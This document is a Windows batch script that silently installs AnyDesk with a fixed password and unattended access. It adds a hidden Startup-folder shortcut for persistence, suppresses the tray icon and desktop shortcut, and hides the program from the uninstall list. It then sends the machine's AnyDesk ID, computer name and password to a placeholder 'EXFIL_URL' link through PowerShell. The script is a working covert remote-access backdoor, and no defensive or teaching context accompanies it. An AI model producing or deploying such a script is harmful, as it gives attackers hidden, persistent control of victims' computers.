@echo off
setlocal enabledelayedexpansion

:: --- Configuration ---
set "INSTALLER=%~dp0AnyDesk.exe"
set "LOGFILE=%~dp0Client_IDs.txt"
set "EXFIL_URL=[PUT_YOUR_PIPEDREAM_LINK_HERE]"
set "PASSWORD=[PUT_YOUR_PASSWORD_HERE]"
set "AD_EXE=C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
set "AD_SYS_CONF=%ProgramData%\AnyDesk\system.conf"
set "STARTUP_DIR=%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"

echo [1/6] Installing AnyDesk...
start /wait "" "%INSTALLER%" --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent

echo [2/6] Setting Password...
echo %PASSWORD% | "%AD_EXE%" --set-password

echo [3/6] Applying 'Never Show' Settings...
taskkill /f /im AnyDesk.exe >nul 2>&1
net stop AnyDesk /y >nul 2>&1
:: Force the Interactive Access setting into the config
echo ad.security.interactive_access=2 >> "%AD_SYS_CONF%"

echo [4/6] FORCING STARTUP FOLDER SHORTCUT...
:: Create a shortcut in the Startup folder for persistent launch
echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\s.vbs
echo sLinkFile = "%STARTUP_DIR%\AnyDesk.lnk" >> %temp%\s.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %temp%\s.vbs
echo oLink.TargetPath = "%AD_EXE%" >> %temp%\s.vbs
echo oLink.Arguments = "--tray" >> %temp%\s.vbs
echo oLink.Save >> %temp%\s.vbs
cscript /nologo %temp%\s.vbs
del %temp%\s.vbs

echo [5/6] Hiding UI and Icons...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\AnyDesk" /v "ShowTrayIcon" /t REG_DWORD /d 0 /f >nul 2>&1
if exist "%PUBLIC%\Desktop\AnyDesk.lnk" del /f /q "%PUBLIC%\Desktop\AnyDesk.lnk"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\AnyDesk" /v "SystemComponent" /t REG_DWORD /d 1 /f >nul 2>&1

echo [6/6] Finalizing and Retrieving ID...
net start AnyDesk >nul 2>&1

:: --- IMPROVED ID WAIT LOOP ---
echo Waiting for Network ID (This may take up to 30 seconds)...
set /a retry_count=0

:wait_id
timeout /t 5 /nobreak >nul
set /a retry_count+=1
for /f "delims=" %%i in ('"%AD_EXE%" --get-id') do set CID=%%i

:: If stuck for too long (over 1 min), restart the service to kickstart connection
if %retry_count% GEQ 12 (
    echo [!] Connection slow. Restarting service...
    net stop AnyDesk /y >nul 2>&1
    net start AnyDesk >nul 2>&1
    set /a retry_count=0
)

if "%CID%"=="0" goto wait_id
if "%CID%"=="" goto wait_id

:: Send data to your phone/web link
powershell -Command "Invoke-RestMethod -Uri '%EXFIL_URL%?id=%CID%&pc=%COMPUTERNAME%&pwd=%PASSWORD%' -Method Get" >nul 2>&1

:: Local Backup
set "STAMP=%DATE% %TIME%"
echo [%STAMP%] %COMPUTERNAME% : %CID% >> "%LOGFILE%"

:: Final Output
echo ---------------------------------------------------
echo Deployment Complete. 
echo PC: %COMPUTERNAME%
echo ID: %CID% ^| Password: %PASSWORD%
echo Link: %EXFIL_URL%
echo ---------------------------------------------------
pause